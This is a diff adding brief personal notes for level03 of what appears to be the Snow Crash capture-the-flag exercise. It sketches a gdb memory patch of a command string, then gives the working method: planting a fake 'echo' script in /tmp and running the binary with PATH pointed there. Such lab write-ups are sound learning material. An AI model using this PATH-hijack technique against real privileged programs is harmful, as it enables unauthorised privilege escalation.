@@ -1,0 +1,17 @@
+- run: gdb ./level03
+- then, in gdb:
+b main (set breakpoint in main)
+run
+- when reaching main breakpoint:
+disassemble (lets you see the assembly instructions)
+- copy the movl argument (address before %esp) just before system as this is
+  the address of the command string in memory, then:
+set { char[9] } 0x000000 = "getflag;" (replace 0x000000 by the actual address)
+- then run and get the flag
+
+
+- ALL THAT ABOVE IS SHIT
+- just scp the echo script here to <snow_crash_ip>:/tmp
+- then run in the vm run 'cd /tmp && chmod +x echo'
+- go back to level03 directory
+- run 'env PATH="/tmp" ./level03' and voila -_-
